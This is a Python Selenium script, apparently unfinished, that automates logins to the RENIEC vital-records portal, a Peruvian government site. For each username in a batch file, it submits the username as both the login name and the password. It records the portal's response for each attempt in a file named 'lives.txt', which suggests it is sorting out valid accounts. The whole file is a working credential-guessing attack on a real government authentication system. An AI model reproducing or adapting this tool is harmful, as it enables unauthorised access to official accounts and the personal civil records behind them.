from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

import pandas



driver = webdriver.Chrome(executable_path="./chromedriver.exe")
url = "https://portalrcm.reniec.gob.pe/hechosvitales/Logout.do"

#Paths
path_Usuario ='/html/body/div[1]/form/fieldset/div[2]/div[1]/input'
path_contrasenia= '//*[@id="txtPass"]'
id_contrasenia = 'txtPass'

path_IngresarButton = '/html/body/div[1]/form/fieldset/div[2]/div[3]/small/button[1]'

path_Mensaje = '/html/body/div[6]/div[2]/div/p'
mensajeCentro = '/html/body/div[4]/div[2]/div/p' # el de la "p" chales, a veces es 4 y 5

path_AceptarButton = '/html/body/div[4]/div[3]/div/button' # button tyhpe a veces es 4 y 5
#path_AceptarButton2 = '/html/body/div[5]/div[3]/div/button'

path_Limpiar = '/html/body/div[1]/form/fieldset/div[2]/div[3]/small/button[2]'


#Abriendo el navegador
options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(options=options)

driver.get(url)
system("cls")


arhivo_lote = open("lote.txt","r")
textoUser = arhivo_lote.readlines()
arhivo_lote.close()

#input("Enter para comenzar")
#time.sleep(1.5)

try:

	with open ('./lote.txt') as texto:
		for x in texto:

			wait0 = WebDriverWait(driver,10)
			wait0.until(ec.visibility_of_element_located((By.XPATH,path_Usuario)))


			driver.find_element(By.XPATH ,path_Limpiar).click()  #limpiear todo

			driver.find_element(By.XPATH,path_Usuario).send_keys(x.rstrip()) # Poniendo el usuario
			print(x)


			#driver.find_element(By.ID,id_contrasenia).clear()
			driver.find_element(By.XPATH,path_contrasenia).send_keys(x.rstrip()) #Poniendo la contraseña 

			#driver.find_element(By.ID,id_IngresarBUtton).clear()
			#print(":3")
			driver.find_element(By.XPATH ,path_IngresarButton).click()  #Click en ingresar

			#print("aad")

			try:
				wait1 = WebDriverWait(driver,10)
				wait1.until(ec.visibility_of_element_located((By.XPATH,path_AceptarButton)))
				datos = driver.find_element(By.XPATH, mensajeCentro).text
				print(datos)

				driver.find_element(By.XPATH,path_AceptarButton).click() #Click en ingresar

			except Exception as e:
				print("Texto raro, testear")
				driver.refresh()
			
			#print("a")

			lives = open("lives.txt","a")
			lives.write(x.rstrip() + "  |  " +datos.rstrip() )# escribir en el block
			lives.write("\n")
			lives.close()

			print("----------------------------------------------------------------------------")

except Exception as e:
	input("Erro, enter para terminar")
	input()


print("Fin Del Programa!!!")
arhivo_lote.close()

driver.close()
# No acabado

